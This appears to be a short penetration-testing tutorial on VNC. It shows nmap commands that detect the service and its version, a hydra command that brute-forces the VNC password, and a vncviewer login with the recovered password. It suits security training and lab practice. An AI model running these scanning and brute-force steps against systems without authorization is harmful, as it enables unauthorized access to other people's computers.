# VNC

***Virtual Network Computing (VNC)*** is a graphical desktop-sharing system that uses the Remote Frame Buffer protocol (RFB) to remotely control another computer. It transmits the keyboard and mouse events from one computer to another, relaying the graphical-screen updates back in the other direction, over a network.

# Enumeration

## Scanning With Nmap

We can use nmap to scan vnc as well as to get the version of vnc running on our target system. 

```bash
nmap -sT -sV -p 5901 [target_ip]
```
![vnc](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/vnc1.png)

Above image shows vnc is running on port 5901/tcp on our target. It also reveals the version of vnc running, which was `version 3.8`.

We can also use nmap script to get more information about vnc protocol. 

```bash
nmap -sT --script vnc-info.nse -p 5901 [target_ip]
```

# Bruteforcing Vnc Password

## hydra

Using hydra , we can bruteforce password of vnc, which if successful will allow us to login to our target system.

```bash
hydra -s [vnc_port] -P [/path/to/password/wordlist] [target_ip] vnc
```
![vnc](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/vnc3.png)

In the above image we were able to get a valid password `pass1234`.

# Exploitation

With the valid password in hand, we can login to our target system using `vncviewer`.

```bash
vncviewer [target_ip]:[port]
```
